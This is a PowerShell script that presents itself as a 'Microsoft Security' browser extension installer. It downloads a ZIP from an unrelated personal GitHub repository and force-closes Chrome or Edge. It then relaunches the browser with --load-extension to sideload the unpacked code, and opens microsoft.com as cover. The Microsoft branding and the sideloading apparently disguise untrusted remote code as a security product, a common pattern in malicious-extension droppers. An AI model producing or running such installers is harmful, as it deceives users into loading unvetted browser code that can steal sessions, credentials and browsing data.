<#
  Microsoft Security - Extension Installer
  Downloads the extension from GitHub and installs it into your browser
#>

$ErrorActionPreference = "Stop"

$GITHUB_ZIP = "https://github.com/sadidulas/extention/archive/refs/heads/main.zip"
$EXTRACT_DIR = "$env:LOCALAPPDATA\Microsoft-Security-Extension"
$TEMP_ZIP = "$env:TEMP\microsoft-security-ext.zip"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Microsoft Security - Extension Installer" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# 1. Download extension from GitHub
Write-Host "[1/4] Downloading extension from GitHub..." -ForegroundColor Yellow
try {
  $wc = New-Object System.Net.WebClient
  $wc.DownloadFile($GITHUB_ZIP, $TEMP_ZIP)
  Write-Host "  Downloaded to: $TEMP_ZIP" -ForegroundColor Green
} catch {
  Write-Host "  FAILED to download: $_" -ForegroundColor Red
  pause
  exit 1
}

# 2. Extract to local folder
Write-Host "[2/4] Extracting extension..." -ForegroundColor Yellow
try {
  if (Test-Path $EXTRACT_DIR) {
    Remove-Item -Path $EXTRACT_DIR -Recurse -Force
  }
  New-Item -ItemType Directory -Path $EXTRACT_DIR -Force | Out-Null

  # Extract ZIP
  Add-Type -AssemblyName System.IO.Compression.FileSystem
  $zip = [System.IO.Compression.ZipFile]::OpenRead($TEMP_ZIP)
  $extractedFolder = $null
  foreach ($entry in $zip.Entries) {
    if ($entry.FullName -match "^[^/]+/") {
      $folderName = $matches[0]
      if (-not $extractedFolder) { $extractedFolder = $folderName }
      break
    }
  }

  # Extract all files, stripping the root folder
  foreach ($entry in $zip.Entries) {
    $relativePath = $entry.FullName -replace "^[^/]+/", ""
    if ([string]::IsNullOrEmpty($relativePath)) { continue }

    $destPath = Join-Path $EXTRACT_DIR $relativePath
    $destDir = Split-Path $destPath -Parent

    if (-not (Test-Path $destDir)) {
      New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }

    if (-not ($entry.FullName.EndsWith("/"))) {
      [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $true)
    }
  }
  $zip.Dispose()

  Write-Host "  Extracted to: $EXTRACT_DIR" -ForegroundColor Green
} catch {
  Write-Host "  FAILED to extract: $_" -ForegroundColor Red
  pause
  exit 1
}

# Cleanup temp zip
Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue

# 3. Detect browsers and install
Write-Host "[3/4] Detecting browsers..." -ForegroundColor Yellow

$installed = @()
$chromePath = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
$chromePathX86 = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
$edgePath = "$env:ProgramFiles (x86)\Microsoft\Edge\Application\msedge.exe"

# Check Chrome
if (Test-Path $chromePath) {
  $installed += @{ Name = "Google Chrome"; Path = $chromePath; Exe = "chrome.exe" }
} elseif (Test-Path $chromePathX86) {
  $installed += @{ Name = "Google Chrome"; Path = $chromePathX86; Exe = "chrome.exe" }
}

# Check Edge
if (Test-Path $edgePath) {
  $installed += @{ Name = "Microsoft Edge"; Path = $edgePath; Exe = "msedge.exe" }
}

if ($installed.Count -eq 0) {
  Write-Host "  No supported browser found (Chrome/Edge)." -ForegroundColor Red
  Write-Host "  Extension files are at: $EXTRACT_DIR" -ForegroundColor Yellow
  pause
  exit 1
}

Write-Host "  Found: $($installed | ForEach-Object { $_.Name })" -ForegroundColor Green

# 4. Launch browser with extension
Write-Host "[4/4] Installing extension into browser..." -ForegroundColor Yellow

$browser = $installed[0]  # Use first found
$extPath = Join-Path $EXTRACT_DIR "microsoft-security-extension"

# Kill existing browser processes so --load-extension works cleanly
Write-Host "  Closing existing $($browser.Name) processes..." -ForegroundColor Gray
Get-Process -Name $browser.Exe.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force

Start-Sleep 1

Write-Host "  Launching $($browser.Name) with extension..." -ForegroundColor Green
Start-Process -FilePath $browser.Path -ArgumentList "--load-extension=`"$extPath`"", "--new-window", "https://microsoft.com/en/security"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  INSTALLATION COMPLETE!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Extension loaded: Microsoft Security" -ForegroundColor Green
Write-Host "  Location: $extPath" -ForegroundColor Gray
Write-Host ""
Write-Host "  NOTE: The extension loads every time you" -ForegroundColor Yellow
Write-Host "  launch the browser with this installer." -ForegroundColor Yellow
Write-Host "  For permanent install, load it manually:" -ForegroundColor Yellow
Write-Host "  1. Open chrome://extensions" -ForegroundColor White
Write-Host "  2. Enable Developer mode" -ForegroundColor White
Write-Host "  3. Click 'Load unpacked' and select:" -ForegroundColor White
Write-Host "     $extPath" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

pause
